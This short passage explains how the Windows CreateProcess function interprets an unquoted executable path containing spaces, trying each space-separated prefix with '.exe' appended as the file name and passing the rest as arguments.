# When a service is started and a process is created, the Windows CreateProcess function is used. Reviewing the first parameter of the function, lpApplicationName is used to specify the name and optionally the path to the executable file. If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to the function where the file name ends and the arguments begin. To determine this, the function starts interpreting the path from left to right until a space is reached. For every space in the file path, the function uses the preceding part as file name by adding .exe and the rest as arguments.
